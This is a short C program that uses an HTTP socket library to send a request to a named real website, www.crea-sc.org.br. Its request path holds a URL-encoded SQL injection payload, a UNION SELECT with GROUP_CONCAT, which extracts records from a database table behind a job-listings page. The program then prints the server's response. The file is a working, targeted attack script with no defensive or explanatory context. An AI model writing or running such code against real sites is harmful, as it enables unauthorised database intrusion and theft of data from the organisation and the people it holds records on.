#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <orion/socket/socket.h>
#include <orion/socket/http.h>

int main(int argc, char** argv)
{
	orion_httpRequest *req = NULL;
	char *response = NULL;
	char reqBuffer[HTTP_REQUEST_MAXLENGTH];
	int code;
	
	const char* domain = "www.crea-sc.org.br";
    // Initialize the library
    orion_initHttpRequest(&req);
    orion_setHttpRequestHost(req, domain, 80);
    orion_setHttpRequestPath(req, "http://www.crea-sc.org.br/portal/siteantigo/bolsa_empregos/cons_vaga.php?codigo=-1%27%20UNION%20SELECT%201,CONCAT(%27$%27,GROUP_CONCAT(numart),%27$%27),3,4,5,6,7,8%20FROM%20(SELECT%20DISTINCT%20numart%20FROM%20crea_net.sartweb%20limit%200,40)%20AS%20X/*");
	orion_setHttpRequestHeader(req, "Host", domain);
	orion_setHttpRequestHeader(req, "User-Agent", "Anakin");
	
	orion_assemblyHttpRequest(req, reqBuffer);
	
	code = orion_httpRequestPerform(req, &response);
	
	if (code == ORIONSOCKET_OK)
	{
		printf("%s\n", response);
		
		free(response);
	}
    
    // Free's library
    orion_cleanupHttpRequest(req);
    
	return 0;
}

